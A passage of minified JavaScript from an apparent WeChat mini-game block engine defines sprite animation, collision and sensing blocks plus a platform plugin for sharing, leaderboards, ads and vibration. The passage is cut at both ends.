                        r.endAlpha = e, i.forEach(function (t) {
                            t._startAlpha = t.alpha;
                        }), r.duration <= 0 ? i.forEach(function (t) {
                            t.setAlpha(e), t._startAlpha = null;
                        }) : this.currentThread.setYieldStatus());
            }
        }, {
            key: "rollingCircle",
            value: function (t, n) {
                var e = this.currentThread.target, i = e.id, s = e.renderer, r = this._runtime.runtimeData.getSpriteById(i), a = (s.width / this._runtime.devicePixel).toFixed(2), o = this.renderer.gameWidth / this._runtime.devicePixel;
                if (!this.currentThread.target.animationId) {
                    for (var l = [i], h = this, u = 0; u < LB.Util.toNumber(t); u++) {
                        var c = this._runtime.runtimeData.makeClone(r, i);
                        c.renderer.setX(s.getX() + a * (u + 1)), l.push(c.id);
                    }
                    var p = void 0, p = window.requestAnimationFrame(function t() {
                        if (h.renderer.runtimeData) {
                            for (var e = 0; e < l.length; e++) {
                                var i = h.renderer.getSpriteById(l[e]);
                                i.checkOutOfBoundary() && i.setX(n < 0 ? o / 2 + a / 2 : -(o / 2 + a / 2)), i.goForward(LB.Util.toNumber(n));
                            }
                            p = window.requestAnimationFrame(t), h.currentThread.target.animationId = p;
                        }
                    });
                    this.currentThread.target.animationId = p;
                }
            }
        }, {
            key: "currentThread",
            get: function () {
                return this._blockEngine.currentThread;
            }
        }, {
            key: "blockEngine",
            get: function () {
                return this._blockEngine;
            }
        }]), e;
    }(LB.SDK.IPluginInstanceBase)), Action$5 = {
        Qg5osTEvbg: {
            args: [{
                type: "list",
                name: "OPTION_LIST1",
                options: LB.BlockHelper.getSpritesListWithoutContainer,
                isTarget: !0
            }, {
                type: "input",
                name: "SECS",
                input: "p_number",
                default: 1
            }, {
                type: "list",
                name: "OPTION_LIST",
                options: [["循环", "_loop_"], ["不循环", "_no_loop_"]]
            }],
            fun: function () {
                this.frameAnimation.apply(this, arguments);
            }
        },
        Amld72yfee: {
            args: [{
                type: "list",
                name: "OPTION_LIST1",
                options: LB.BlockHelper.getSpritesListWithoutContainer,
                isTarget: !0
            }],
            fun: function () {
                this.stopFrameAnimation.apply(this, arguments);
            }
        },
        qHjea00gvX: {
            visible: !1,
            args: [{
                type: "list",
                name: "OPTION_LIST1",
                options: LB.BlockHelper.getSpritesListWithSelf,
                isTarget: !0
            }, {
                type: "input",
                name: "SECS",
                input: "p_number",
                default: 1
            }],
            fun: function () {
                this.fadeOut.apply(this, arguments);
            }
        },
        BeNjH7bRp1: {
            visible: !1,
            args: [{
                type: "list",
                name: "OPTION_LIST1",
                options: LB.BlockHelper.getSpritesListWithSelf,
                isTarget: !0
            }, {
                type: "input",
                name: "SECS",
                input: "p_number",
                default: 1
            }],
            fun: function () {
                this.fadeIn.apply(this, arguments);
            }
        },
        y1CNAsIYG0: {
            args: [{
                type: "list",
                name: "OPTION_LIST1",
                options: LB.BlockHelper.getSpritesListWithSelf,
                isTarget: !0
            }, {
                type: "input",
                name: "SECS",
                input: "p_number",
                default: 1
            }, {
                type: "input",
                name: "VALUE",
                input: "p_number",
                default: .5
            }],
            fun: function () {
                this.fade.apply(this, arguments);
            }
        },
        BLT8bOnx6g: {
            args: [{
                type: "list",
                name: "OPTION_LIST1",
                options: LB.BlockHelper.getSpritesListWithSelf,
                isTarget: !0
            }, {
                type: "input",
                name: "SECS",
                input: "p_number",
                default: 1
            }, {
                type: "input",
                name: "VALUEX",
                input: "p_number",
                default: .5
            }, {
                type: "input",
                name: "VALUEY",
                input: "p_number",
                default: .5
            }],
            fun: function () {
                this.scale.apply(this, arguments);
            }
        },
        PHGdP7XtJy: {
            args: [{
                type: "list",
                name: "OPTION_LIST1",
                options: LB.BlockHelper.getSpritesListWithSelf,
                isTarget: !0
            }, {
                type: "input",
                name: "SECS",
                input: "p_number",
                default: 1
            }, {
                type: "input",
                name: "X",
                input: "number",
                default: 0
            }, {
                type: "input",
                name: "Y",
                input: "number",
                default: 0
            }],
            fun: function () {
                this.glideToPositionByPos.apply(this, arguments);
            }
        },
        cHyHRHJSCk: {
            args: [{
                type: "list",
                name: "OPTION_LIST1",
                options: LB.BlockHelper.getSpritesListWithSelf,
                isTarget: !0
            }, {
                type: "input",
                name: "SECS",
                input: "p_number",
                default: 1
            }, {
                type: "list",
                name: "OPTION_LIST",
                options: LB.BlockHelper.getSpriteListGoto
            }],
            fun: function () {
                this.glideToPosition.apply(this, arguments);
            }
        },
        zG3tOjTsaA: {
            visible: !1,
            args: [{
                type: "input",
                name: "NUM",
                input: "w_number",
                default: 2
            }, {
                type: "input",
                name: "SPEED",
                input: "number",
                default: -2
            }],
            fun: function () {
                this.rollingCircle.apply(this, arguments);
            }
        }
    }, Condition$4 = {}, Expression$4 = {}, _class$8 = function (t) {
        function e(t) {
            return classCallCheck(this, e), possibleConstructorReturn(this, (e.__proto__ || Object.getPrototypeOf(e)).call(this, t));
        }
        return inherits(e, t), createClass(e, [{
            key: "release",
            value: function () {
                get(e.prototype.__proto__ || Object.getPrototypeOf(e.prototype), "release", this).call(this);
            }
        }]), e;
    }(LB.SDK.IPluginBase), FIX_NUM = (_class$8.Instance = _class$9, _class$8.Action = Action$5,
        _class$8.Condition = Condition$4, _class$8.Expression = Expression$4, 2), _class$7 = function (t) {
            function e(t) {
                return classCallCheck(this, e), (t = possibleConstructorReturn(this, (e.__proto__ || Object.getPrototypeOf(e)).call(this, t)))._blockEngine = t._runtime._blockEngine,
                    t.renderer = t._runtime.renderer, t;
            }
            return inherits(e, t), createClass(e, [{
                key: "release",
                value: function () {
                    get(e.prototype.__proto__ || Object.getPrototypeOf(e.prototype), "release", this).call(this);
                }
            }, {
                key: "getMousePoint",
                value: function (t) {
                    var e = (i = this._runtime.inputManager).mouseX, i = i.mouseY;
                    return "_x_" === t ? (e / this._runtime.devicePixel).toFixed(FIX_NUM) : "_y_" === t ? (i / this._runtime.devicePixel).toFixed(FIX_NUM) : void 0;
                }
            }, {
                key: "getCollisionPoint",
                value: function (t) {
                    var e = this.currentThread.target.id;
                    if ((i = this.renderer.collisionManager).collisionPairs[e]) {
                        var i, n = i.collisionPairs[e][0];
                        if (i = i.collisionRecord[e + "--" + n]) {
                            if ("_x_" === t) return (i.x / this._runtime.devicePixel - 375).toFixed(FIX_NUM);
                            if ("_y_" === t) return (667 - i.y / this._runtime.devicePixel).toFixed(FIX_NUM);
                        }
                    }
                    return 0;
                }
            }, {
                key: "isSpriteBehaviorCondition",
                value: function (t, e, i) {
                    return this._callBehaviorFun(t, e, i, "Condition");
                }
            }, {
                key: "_callBehaviorFun",
                value: function (t, e, i, n) {
                    if (!(t = this._runtime.runtimeData.checkAndgetSpriteId({
                        str: t,
                        thread: this.currentThread
                    }))) return !1;
                    if (LB.Util.isArray(t) && (t = t[0]), !(1 < (i = i.split("-")).length)) return !1;
                    if (i = i[1], t = this._runtime.runtimeData.getSpriteById(t)) {
                        if (!(t = t.getBehaviorInstaceById(e))) return !1;
                        try {
                            return LB.Behaviors[e][n][i].fun.call(t);
                        } catch (t) {
                            return !1;
                        }
                    }
                }
            }, {
                key: "getSpriteBehaviorProperty",
                value: function (t, e, i) {
                    return this._callBehaviorFun(t, e, i, "Expression");
                }
            }, {
                key: "getMouseMoveDiff",
                value: function (t) {
                    var e = (i = this._runtime.inputManager).mouseMoveDiffX, i = i.mouseMoveDiffY;
                    return "_x_" === t ? (e / this._runtime.devicePixel).toFixed(FIX_NUM) : "_y_" === t ? (i / this._runtime.devicePixel).toFixed(FIX_NUM) : void 0;
                }
            }, {
                key: "getSpriteBoolean",
                value: function (t, e) {
                    if (!(t = this._runtime.runtimeData.checkAndgetSpriteId({
                        str: t,
                        thread: this.currentThread
                    }))) return !1;
                    LB.Util.isArray(t) && (t = t[0]);
                    var i = this.renderer.getSpriteById(t);
                    switch (e) {
                        case "_visible_":
                            return i.visible;

                        case "_invisible_":
                            return !i.visible;

                        default:
                            return;
                    }
                }
            }, {
                key: "getSpriteProperty",
                value: function (t, e) {
                    var i = this._runtime.runtimeData.checkAndgetSpriteId({
                        str: t,
                        thread: this.currentThread
                    });
                    if (i) switch (LB.Util.isArray(i) && (i = i[0]), e) {
                        case "_id_":
                            return i;

                        case "_list_index_":
                            return "_stage_" === i ? "" : (s = this._runtime.runtimeData.getSpriteById(i)) ? s._listIndex : -1;

                        case "_x_":
                            return "_stage_" === i ? this.renderer.stageInfo.pos.x : (this.renderer.getSpriteById(i).getX() / this._runtime.devicePixel).toFixed(FIX_NUM);

                        case "_y_":
                            return "_stage_" === i ? this.renderer.stageInfo.pos.y : (this.renderer.getSpriteById(i).getY() / this._runtime.devicePixel).toFixed(FIX_NUM);

                        case "_global_x_":
                            return "_stage_" === i ? this.renderer.stageInfo.pos.x : (this.renderer.getSpriteById(i).getX(!0) / this._runtime.devicePixel).toFixed(FIX_NUM);

                        case "_global_y_":
                            return "_stage_" === i ? this.renderer.stageInfo.pos.y : (this.renderer.getSpriteById(i).getY(!0) / this._runtime.devicePixel).toFixed(FIX_NUM);

                        case "_width_":
                            return ("_stage_" === i ? this.renderer.realWidth / this._runtime.devicePixel : "container" != (s = this.renderer.getSpriteById(i)).type ? s.width / this._runtime.devicePixel : (console.log(s.getAABB()),
                                s.getAABB().width / this._runtime.devicePixel)).toFixed(FIX_NUM);

                        case "_height_":
                            return ("_stage_" === i ? this.renderer.realHeight / this._runtime.devicePixel : "container" != (s = this.renderer.getSpriteById(i)).type ? s.height / this._runtime.devicePixel : s.getAABB().height / this._runtime.devicePixel).toFixed(FIX_NUM);

                        case "_scale_x_":
                            return "_stage_" === i ? 1 : (this.renderer.getSpriteById(i).scale.x / this._runtime.devicePixel).toFixed(FIX_NUM);

                        case "_alpha_":
                            return "_stage_" === i ? 1 : this.renderer.getSpriteById(i).alpha;

                        case "_rotation_":
                            return "_stage_" === i ? 1 : this.renderer.getSpriteById(i).getRotation();

                        case "_towards_rotation_":
                            return "_stage_" === i ? 0 : this.renderer.getSpriteById(i).getTowardsRotation();

                        case "_face_rotation_":
                            return "_stage_" === i ? 0 : this.renderer.getSpriteById(i).getFaceRotation();

                        case "_style_index_":
                            var n, s = void 0;
                            return (s = "_stage_" === i ? this._runtime.runtimeData.currentScene.background : "_self_" === t ? this.currentThread.target : this._runtime.runtimeData.getSpriteById(i)) ? (n = s.currentStyle,
                                (s = s.styles) && n ? s.indexOf(n) + 1 : 0) : null;

                        default:
                            return;
                    }
                }
            }, {
                key: "getDraggable",
                value: function () {
                    return this.currentThread.target.renderer.dragMode;
                }
            }, {
                key: "intersect",
                value: function (t, e) {
                    var i, n, s, r = this._runtime.runtimeData.checkAndgetSpriteId({
                        str: t,
                        thread: this.currentThread
                    }), a = this._runtime.runtimeData.checkAndgetSpriteId({
                        str: e,
                        thread: this.currentThread,
                        single: !0
                    });
                    return !(!(r = LB.Util.isArray(r) ? r[0] : r) || !a || (i = r, "_self_" === t && (n = (t = this.currentThread.target).isOriginal,
                        s = t.id, t = t.mother, i = n ? s : t), !(n = this.renderer.getSpriteById(r)).visible) || n.noCollision) && ("_edge_" === a || "_left_edge_" === a || "_right_edge_" === a || "_top_edge_" === a || "_bottom_edge_" === a ? ((s = n.checkCollisionOfEdge(a)) && (this.currentThread.scope[i] = r),
                            s) : (n = (t = this.renderer.collisionManager.intersect(r, a)).result, s = t.spriteID1,
                                r = t.spriteID2, n && (this.currentThread.scope[i] = s, this.currentThread.scope[e] = r),
                                n));
                }
            }, {
                key: "collisionState",
                value: function (t, e, i, n) {
                    return t[i + n] ? !e && (t[i + n] = !1) : !!e && (t[i + n] = !0);
                }
            }, {
                key: "collision",
                value: function (t, e) {
                    var i, n, s, r = this._runtime.runtimeData.checkAndgetSpriteId({
                        str: t,
                        thread: this.currentThread
                    }), a = this._runtime.runtimeData.checkAndgetSpriteId({
                        str: e,
                        thread: this.currentThread,
                        single: !0
                    });
                    return !(!(r = LB.Util.isArray(r) ? r[0] : r) || !a || (i = r, "_self_" === t && (n = (t = this.currentThread.target).isOriginal,
                        s = t.id, t = t.mother, i = n ? s : t), !(n = this.renderer.getSpriteById(r)).visible) || n.noCollision) && ("_edge_" === a || "_left_edge_" === a || "_right_edge_" === a || "_top_edge_" === a || "_bottom_edge_" === a ? ((s = n.checkCollisionOfEdge(a)) && (this.currentThread.scope[i] = r),
                            s) : (n = (t = this.renderer.collisionManager.collision(r, a)).result, s = t.spriteID1,
                                r = t.spriteID2, n && (this.currentThread.scope[i] = s, this.currentThread.scope[e] = r),
                                n));
                }
            }, {
                key: "globalTouch",
                value: function (t) {
                    return "_press_" === t && this._runtime.inputManager.isMouseDown;
                }
            }, {
                key: "outOfBoundary",
                value: function (t, e) {
                    if (t = this._runtime.runtimeData.checkAndgetSpriteId({
                        str: t,
                        thread: this.currentThread,
                        single: !0
                    })) return this.renderer.getSpriteById(t).checkOutOfBoundary(e);
                }
            }, {
                key: "getTimer",
                value: function (t) {
                    return this._runtime.runtimeData.clock.projectTimer();
                }
            }, {
                key: "resetTimer",
                value: function (t) {
                    return this._runtime.runtimeData.clock.resetProjectTimer();
                }
            }, {
                key: "current",
                value: function (t) {
                    var t = String(t).toLowerCase(), e = new Date();
                    switch (t) {
                        case "year":
                            return e.getFullYear();

                        case "month":
                            return e.getMonth() + 1;

                        case "date":
                            return e.getDate();

                        case "dayofweek":
                            return e.getDay() + 1;

                        case "hour":
                            return e.getHours();

                        case "minute":
                            return e.getMinutes();

                        case "second":
                            return e.getSeconds();
                    }
                    return 0;
                }
            }, {
                key: "distance",
                value: function (t, e) {
                    var t = this._runtime.runtimeData.checkAndgetSpriteId({
                        str: t,
                        thread: this.currentThread,
                        single: !0
                    }), i = this._runtime.runtimeData.checkAndgetSpriteId({
                        str: e,
                        thread: this.currentThread,
                        single: !0
                    });
                    if (!t || !i) return !1;
                    var n = this.renderer.gameWidth / this._runtime.devicePixel, s = this.renderer.gameHeight / this._runtime.devicePixel, r = +((e = this.renderer.getSpriteById(t)).getX(1) / this._runtime.devicePixel).toFixed(FIX_NUM), a = +(e.getY(1) / this._runtime.devicePixel).toFixed(FIX_NUM), o = void 0, l = void 0;
                    switch (i) {
                        case "_left_edge_":
                            return +Math.abs(n / 2 + r).toFixed(FIX_NUM);

                        case "_right_edge_":
                            return +Math.abs(n / 2 - r).toFixed(FIX_NUM);

                        case "_top_edge_":
                            return +Math.abs(s / 2 - a).toFixed(FIX_NUM);

                        case "_bottom_edge_":
                            return +Math.abs(s / 2 + a).toFixed(FIX_NUM);

                        case "_finger_":
                            var h = (u = this._runtime.inputManager).mouseX, u = u.mouseY, o = h / this._runtime.devicePixel, l = u / this._runtime.devicePixel;
                            return !isNaN(o) && !isNaN(l) && Math.sqrt(Math.pow(parseFloat(r) - parseFloat(o), 2) + Math.pow(parseFloat(a) - parseFloat(l), 2)).toFixed(FIX_NUM);

                        default:
                            return o = ((h = this.renderer.getSpriteById(i)).getX(1) / this._runtime.devicePixel).toFixed(FIX_NUM),
                                l = (h.getY(1) / this._runtime.devicePixel).toFixed(FIX_NUM), Math.sqrt(Math.pow(parseFloat(r) - parseFloat(o), 2) + Math.pow(parseFloat(a) - parseFloat(l), 2)).toFixed(FIX_NUM);
                    }
                }
            }, {
                key: "gyroscope",
                value: function (t) { }
            }, {
                key: "isInSpecificScene",
                value: function (t) {
                    return this._runtime.runtimeData.current_scene_id === t;
                }
            }, {
                key: "currentThread",
                get: function () {
                    return this._blockEngine.currentThread;
                }
            }, {
                key: "blockEngine",
                get: function () {
                    return this._blockEngine;
                }
            }]), e;
        }(LB.SDK.IPluginInstanceBase), Action$4 = {}, Condition$3 = {
            JfwC1Dp3bG: {
                args: [{
                    type: "list",
                    name: "OPTION_LIST1",
                    options: LB.BlockHelper.getLayerListWithSelf
                }, {
                    type: "list",
                    name: "OPTION_LIST2",
                    options: LB.BlockHelper.getSpriteBehavior
                }, {
                    type: "list",
                    name: "OPTION_LIST3",
                    options: LB.BlockHelper.getBehaviorCondition
                }],
                fun: function () {
                    return this.isSpriteBehaviorCondition.apply(this, arguments);
                }
            },
            LhCMOYH1nN: {
                args: [{
                    type: "list",
                    name: "OPTION_LIST1",
                    options: LB.BlockHelper.getLayerListWithSelf
                }, {
                    type: "list",
                    name: "OPTION_LIST2",
                    options: LB.BlockHelper.getSpriteListEdge
                }],
                fun: function () {
                    return !!this.collision.apply(this, arguments);
                }
            },
            fwhrKviVlo: {
                args: [{
                    type: "list",
                    name: "OPTION_LIST1",
                    options: LB.BlockHelper.getLayerListWithSelf
                }, {
                    type: "list",
                    name: "OPTION_LIST2",
                    options: LB.BlockHelper.getSpriteListEdge
                }],
                fun: function () {
                    return !!this.intersect.apply(this, arguments);
                }
            },
            q6U1hliOtU: {
                args: [{
                    type: "list",
                    name: "OPTION_LIST1",
                    options: LB.BlockHelper.getLayerListWithSelf
                }, {
                    type: "list",
                    name: "OPTION_LIST2",
                    options: [["全部边缘", "screen_all_side"], ["左边缘", "screen_left"], ["右边缘", "screen_right"], ["上边缘", "screen_top"], ["下边缘", "screen_bottom"]]
                }],
                fun: function () {
                    return !!this.outOfBoundary.apply(this, arguments);
                }
            },
            NfwxPz7dNH: {
                args: [{
                    type: "list",
                    name: "OPTION_LIST",
                    options: [["按下", "_press_"]]
                }],
                fun: function () {
                    return !!this.globalTouch.apply(this, arguments);
                }
            },
            MlgIv01IdL: {
                args: [{
                    type: "list",
                    name: "OPTION_LIST1",
                    options: LB.BlockHelper.getSpriteListStage
                }, {
                    type: "list",
                    name: "OPTION_LIST2",
                    options: [["显示", "_visible_"], ["隐藏", "_invisible_"]]
                }],
                fun: function () {
                    return !!this.getSpriteBoolean.apply(this, arguments);
                }
            },
            SDVIqrt2Hp: {
                args: [{
                    type: "list",
                    name: "OPTION_LIST",
                    options: LB.BlockHelper.getSceneList
                }],
                fun: function () {
                    return !!this.isInSpecificScene.apply(this, arguments);
                }
            },
            ZyOPtqSe8I: {
                fun: function () {
                    return !(!this.currentThread || !this.currentThread.target || !this.currentThread.target.isCloned);
                }
            }
        }, Expression$3 = {
            U1wYE2UAca: {
                args: [{
                    type: "list",
                    name: "OPTION_LIST1",
                    options: LB.BlockHelper.getSpriteListStage
                }, {
                    type: "list",
                    name: "OPTION_LIST2",
                    options: [["x", "_x_"], ["y", "_y_"], ["全局x", "_global_x_"], ["全局y", "_global_y_"], ["宽度", "_width_"], ["高度", "_height_"], ["大小", "_scale_x_"], ["透明度", "_alpha_"], ["角度", "_rotation_"], ["移动方向", "_towards_rotation_"], ["面向角度", "_face_rotation_"], ["造型索引", "_style_index_"], ["id", "_id_"], ["列表索引", "_list_index_"]]
                }],
                fun: function () {
                    return this.getSpriteProperty.apply(this, arguments);
                }
            },
            DLSu95z4J0: {
                args: [{
                    type: "list",
                    name: "OPTION_LIST1",
                    options: [["x", "_x_"], ["y", "_y_"]]
                }],
                fun: function () {
                    return this.getMousePoint.apply(this, arguments);
                }
            },
            VbobcwTphy: {
                args: [{
                    type: "list",
                    name: "OPTION_LIST1",
                    options: [["x", "_x_"], ["y", "_y_"]]
                }],
                fun: function () {
                    return this.getMouseMoveDiff.apply(this, arguments);
                }
            },
            DsE1BP0F8o: {
                visible: !1,
                args: [{
                    type: "list",
                    name: "OPTION_LIST1",
                    options: [["x", "_x_"], ["y", "_y_"]]
                }],
                fun: function () {
                    return this.getCollisionPoint.apply(this, arguments);
                }
            },
            fkyT1PvwrS: {
                args: [{
                    type: "list",
                    name: "OPTION_LIST1",
                    options: LB.BlockHelper.getLayerListWithSelf
                }, {
                    type: "list",
                    name: "OPTION_LIST2",
                    options: LB.BlockHelper.getSpriteListEdgeDistance
                }],
                fun: function () {
                    return this.distance.apply(this, arguments);
                }
            },
            rBfidGjOoT: {
                args: [{
                    type: "list",
                    name: "OPTION_LIST1",
                    options: LB.BlockHelper.getLayerListWithSelf
                }, {
                    type: "list",
                    name: "OPTION_LIST2",
                    options: LB.BlockHelper.getSpriteBehavior
                }, {
                    type: "list",
                    name: "OPTION_LIST3",
                    options: LB.BlockHelper.getBehaviorProperty
                }],
                fun: function () {
                    return this.getSpriteBehaviorProperty.apply(this, arguments);
                }
            }
        }, _class$6 = function (t) {
            function e(t) {
                return classCallCheck(this, e), possibleConstructorReturn(this, (e.__proto__ || Object.getPrototypeOf(e)).call(this, t));
            }
            return inherits(e, t), createClass(e, [{
                key: "release",
                value: function () {
                    get(e.prototype.__proto__ || Object.getPrototypeOf(e.prototype), "release", this).call(this);
                }
            }]), e;
        }(LB.SDK.IPluginBase), _class$5 = (_class$6.Instance = _class$7, _class$6.Action = Action$4,
            _class$6.Condition = Condition$3, _class$6.Expression = Expression$3, function (t) {
                function n(t) {
                    classCallCheck(this, n);
                    var e = possibleConstructorReturn(this, (n.__proto__ || Object.getPrototypeOf(n)).call(this, t)), t = (e._blockEngine = e._runtime._blockEngine,
                        e.renderer = e._runtime.renderer, window._interstitialId), i = window._videoId;
                    return e.interstitialAd = t, e.share_title = "", e.shareImageUrl = "", e.shareQuery = "",
                        e._runtime.isMiniGame && i && (e.videoAd = wx.createRewardedVideoAd({
                            adUnitId: i
                        }), e.videoAd.onClose(function (t) {
                            t.isEnded && e._runtime.eventEmitter.emit(OPCODE.eventAdEnd), e.renderer.soundManager.resumeBgmByShow();
                        }), e.videoAd.onError(function (t) {
                            e._runtime.eventEmitter.emit(OPCODE.eventAdError), wx.hideLoading();
                        }), e.videoAd.load()), e._runtime.isMiniGame && (wx.onShow(function () {
                            e._runtime && e._runtime.eventEmitter && e._runtime.eventEmitter.emit(OPCODE.eventGameShow);
                        }), wx.onHide(function () {
                            e._runtime && e._runtime.eventEmitter && e._runtime.eventEmitter.emit(OPCODE.eventGameHide);
                        })), e.bannerAd = Object.create(null), e.nativeAd = Object.create(null), e;
                }
                return inherits(n, t), createClass(n, [{
                    key: "release",
                    value: function () {
                        get(n.prototype.__proto__ || Object.getPrototypeOf(n.prototype), "release", this).call(this);
                    }
                }, {
                    key: "reportScore",
                    value: function (t) {
                        this.renderer.subContext.reportScore(Number(t));
                    }
                }, {
                    key: "showRank",
                    value: function () {
                        this.renderer.subContext.showRank();
                    }
                }, {
                    key: "setRankTitle",
                    value: function (t) {
                        this.renderer.subContext.setRankTitle(t);
                    }
                }, {
                    key: "setRankUnit",
                    value: function (t) {
                        this.renderer.subContext.setRankUnit(t);
                    }
                }, {
                    key: "setRankSort",
                    value: function (t) {
                        this.renderer.subContext.setRankSort(t);
                    }
                }, {
                    key: "setRankPeriod",
                    value: function (t) {
                        this.renderer.subContext.setRankPeriod(t);
                    }
                }, {
                    key: "setShareTitle",
                    value: function (t) {
                        this.share_title = t || "";
                    }
                }, {
                    key: "setShareImageUrl",
                    value: function (t) {
                        this.shareImageUrl = t || "";
                    }
                }, {
                    key: "shareAppMessage",
                    value: function () {
                        var t, e;
                        this._runtime.isMiniGame ? (e = void 0, window.isPublish ? e = this.shareQuery : (e = "from=gameinfo",
                            (t = GameGlobal.open_game_info).sceneId && (e += "&scene=" + t.sceneId), t.game_id && (e += "&game_id=" + t.game_id),
                            this.shareQuery && (e += "&params=" + JSON.stringify({
                                data: this.shareQuery
                            }))), wx.shareAppMessage({
                                title: this.share_title || open_game_info.share_title || open_game_info.project_name || "来玩个小游戏吧",
                                imageUrl: this.shareImageUrl || open_game_info.public_share_image_url || open_game_info.screenshot || "https://res.wx.qq.com/wechatgame/product/webpack/userupload/20200929/104614/share.jpg",
                                query: e
                            })) : window.showTips("请在手机微信端体验分享功能");
                    }
                }, {
                    key: "showInterstitialAd",
                    value: function () {
                        var e, i = this;
                        this._runtime.isMiniGame && window.isPublish ? (e = null, wx.createInterstitialAd && this.interstitialAd && (e = wx.createInterstitialAd({
                            adUnitId: this.interstitialAd
                        }), console.log("插屏广告创建: " + this.interstitialAd), e.onClose(function () {
                            e.destroy(), console.log("插屏广告关闭, " + i.interstitialAd);
                        })), e && e.show().catch(function (t) {
                            console.error(t), e.destroy(), e = null, console.log("插屏广告加载失败, " + i.interstitialAd);
                        })) : this.renderer.ui.RewardedVideoAd.show();
                    }
                }, {
                    key: "openAd",
                    value: function (t) {
                        var e = this, i = (r = this.currentThread).blocks, n = r.entry, s = (r = r.target).id, r = r.name;
                        if ("rewardedVideoAd" === t && i.getCache(n).opcode !== OPCODE.eventTouchingSprite) throw new LB.ErrorHelper.CallBlockException(s, r, "打开广告能力需绑定在精灵点击事件上");
                        "interstitialAd" === t ? this.showInterstitialAd() : this._runtime.isMiniGame && window.isPublish ? this.videoAd.show().catch(function () {
                            wx.showLoading(), e.videoAd.load().then(function () {
                                wx.hideLoading(), e.videoAd.show();
                            }).catch(function (t) {
                                wx.hideLoading(), console.log("激励视频 广告显示失败", t);
                            });
                        }) : this.renderer.ui.RewardedVideoAd.show(!0);
                    }
                }, {
                    key: "toggleBanner",
                    value: function (e, t, i) {
                        var n, s, r, a, o;
                        this._runtime.isMiniGame && window.isPublish ? "_show_" === t ? (n = wx.getSystemInfoSync(),
                            s = n.screenWidth, r = n.screenHeight, (a = wx.createBannerAd({
                                adUnitId: i,
                                style: {
                                    left: 0,
                                    top: 76,
                                    width: 300
                                }
                            })).onResize(function () {
                                var t = 0;
                                switch (e) {
                                    case "_left_":
                                        t = 0;
                                        break;

                                    case "_right_":
                                        t = s - a.style.realWidth + .1;
                                        break;

                                    default:
                                        t = s / 2 - a.style.realWidth / 2 + .1;
                                }
                                a.style.left = t, a.style.top = r - a.style.realHeight + .1, console.log("banner Ad loaded");
                            }), o = this, a.onError(function (t) {
                                o.bannerAd[i] = null, console.error("banner Ad loaded error(" + t.errCode + "): id:" + i + ", " + t.errMsg),
                                    wx.hideLoading();
                            }), a.show(), this.bannerAd[i] = a) : this.bannerAd[i] && this.bannerAd[i].hide() : this.renderer.ui.BannerAd.show(e, "_show_" === t);
                    }
                }, {
                    key: "showNativeAd",
                    value: function (t, e, i, n) {
                        var s;
                        this._runtime.isMiniGame && window.isPublish ? (t = LB.Util.toNumber(t), e = LB.Util.toNumber(e),
                            t += (s = wx.getSystemInfoSync()).screenWidth / 2, e = s.screenHeight / 2 - e, "_show_" === i ? void 0 === this.nativeAd[n] || null === this.nativeAd[n] ? this.createNativeAd(t, e, i, n) : (this.nativeAd[n].style.left = t,
                                this.nativeAd[n].style.top = e, this.nativeAd[n].show()) : this.nativeAd[n] && this.nativeAd[n].hide()) : this.renderer.ui.NativeAd.show(t, e, "_show_" === i);
                    }
                }, {
                    key: "createNativeAd",
                    value: function (t, e, i, n) {
                        var s, r;
                        this._runtime.isMiniGame && window.isPublish && ((s = wx.createCustomAd({
                            adUnitId: n,
                            adIntervals: 30,
                            style: {
                                left: t,
                                top: e,
                                width: 350
                            }
                        })).onLoad(function () {
                            console.log("native Ad refesh");
                        }), r = this, s.onError(function (t) {
                            r.nativeAd[n] = null, console.error("banner Ad loaded error(" + t.errCode + "): id:" + n + ", " + t.errMsg),
                                wx.hideLoading();
                        }), s.onClose(function () {
                            s.destroy(), r.nativeAd[n] = null;
                        }), s.show(), this.nativeAd[n] = s);
                    }
                }, {
                    key: "shortVibrate",
                    value: function () {
                        if (this._runtime.isMiniGame) try {
                            wx.vibrateShort();
                        } catch (t) {
                            console.log(t);
                        } else "vibrate" in navigator && window.navigator.vibrate(15);
                    }
                }, {
                    key: "longVibrate",
                    value: function () {
                        if (this._runtime.isMiniGame) try {
                            wx.vibrateLong();
                        } catch (t) {
                            console.log(t);
                        } else "vibrate" in navigator && window.navigator.vibrate(400);
                    }
                }, {
                    key: "currentThread",
                    get: function () {
                        return this._blockEngine.currentThread;
                    }
                }, {
                    key: "blockEngine",
                    get: function () {
                        return this._blockEngine;
                    }
                }]), n;
            }(LB.SDK.IPluginInstanceBase)), Action$3 = {
                XmA45E5x5V: {
                    args: [{
                        type: "input",
                        name: "TEXT_SET",
                        input: "string",
                        default: "不服来战呀"
                    }],
                    fun: function (t) {
                        this.setShareTitle(t);
                    }
                },
                WfHFvkcQRX: {
                    args: [{
                        type: "input",
                        name: "TEXT_SET",
                        input: "string",
                        default: "https://xxx.com/share.png"
                    }],
                    fun: function (t) {
                        this.setShareImageUrl(t);
                    }
                },
                slSgjzJmpQ: {
                    args: [{
                        type: "input",
                        name: "TEXT_SET",
                        input: "string",
                        default: "name=jack"
                    }],
                    fun: function (t) {
                        this.shareQuery = t || "";
                    }
                },
                ALezKqCl7g: {
                    fun: function () {
                        this.shareAppMessage();
                    }
                },
                Z522ylk7nZ: {
                    visible: !0,
                    args: [{
                        type: "list",
                        name: "TYPE",
                        options: LB.BlockHelper.getAdList
                    }],
                    fun: function (t) {
                        this.openAd(t);
                    }
                },
                kliXAPy85Z: {
                    args: [{
                        type: "input",
                        name: "id",
                        input: "string",
                        default: "branchId"
                    }, {
                        type: "list",
                        name: "OPTION_LIST1",
                        options: [["曝光", "1"], ["点击", "2"]]
                    }, {
                        type: "input",
                        name: "branchDim",
                        input: "string",
                        default: "branchDim"
                    }],
                    fun: function (t, e, i) {
                        t && this._runtime.isMiniGame && window.isPublish && wx.reportUserBehaviorBranchAnalytics({
                            branchId: t,
                            branchDim: i,
                            eventType: +e
                        });
                    }
                },
                UgmtwHM10h: {
                    visible: 1,
                    args: [{
                        type: "list",
                        name: "OPTION_LIST1",
                        options: [["居中", "_center_"], ["居左", "_left_"], ["居右", "_right_"]]
                    }, {
                        type: "list",
                        name: "OPTION_LIST2",
                        options: [["显示", "_show_"], ["关闭", "_close_"]]
                    }, {
                        type: "input",
                        name: "TEXT_SET",
                        input: "string",
                        default: "广告位ID"
                    }],
                    fun: function () {
                        this.toggleBanner.apply(this, arguments);
                    }
                },
                zEgz0a3KJ6: {
                    visible: 1,
                    args: [{
                        type: "input",
                        name: "X",
                        input: "number",
                        default: 0
                    }, {
                        type: "input",
                        name: "Y",
                        input: "number",
                        default: 0
                    }, {
                        type: "list",
                        name: "OPTION_LIST",
